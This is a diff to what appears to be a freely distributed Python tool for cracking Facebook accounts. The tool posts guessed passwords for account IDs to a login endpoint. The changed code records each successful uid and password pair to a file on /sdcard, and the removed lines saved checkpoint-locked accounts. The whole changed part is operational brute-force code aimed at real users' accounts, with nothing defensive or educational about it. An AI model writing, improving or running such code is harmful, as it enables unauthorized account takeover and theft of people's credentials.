@@ -49,7 +49,7 @@ logo=("""\033[38;5;92m           ███    ██ ██   ██ ███�
 \033[38;5;88m           ██   ████ ██   ██    ██    
 \033[38;5;237m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[38;5;243m [\033[1;31m+\033[38;5;243m] \033[1;32mAUTHOR    \033[1;31m• \033[38;5;252mTOPU-NILL
-\033[38;5;242m [\033[1;31m+\033[38;5;242m] \033[1;32mVERSION   \033[1;31m• \033[38;5;251m0.0.2
+\033[38;5;242m [\033[1;31m+\033[38;5;242m] \033[1;32mVERSION   \033[1;31m• \033[38;5;251m0.0.3
 \033[38;5;241m [\033[1;31m+\033[38;5;241m] \033[1;32mOWNER     \033[1;31m•\033[38;5;50m NILL x TOPU
 \033[38;5;240m [\033[1;31m+\033[38;5;240m] \033[1;32mSTATUS    \033[1;31m• \033[38;5;249mFREE
 \033[38;5;236m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[1;37m""")
@@ -429,18 +429,19 @@ def rndm(ids,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [NXT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/NXT-RND-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(uid))
-                                        break
-                                elif 'www.facebook.com' in q['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [NXT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/NXT-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                        else:
-                                                open('/sdcard/NXT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                        uid=str(q['uid'])
+                                        try:
+                                                okk=open('/sdcard/NXT-RN-OK.txt','r').read()
+                                                if uid in okk:pass
+                                                else:
+                                                        print('\r\r\033[1;32m [NXT-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        oks.append(ids)
+                                                        break
+                                        except:
+                                                print('\r\r\033[1;32m [NXT-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                oks.append(ids)
                                                 break
                                 else:
                                         continue
@@ -449,6 +450,7 @@ def rndm(ids,passlist):
                         time.sleep(10)
                 except Exception as e:
                         pass
+                        
 try:
         menu()
 except requests.exceptions.ConnectionError:
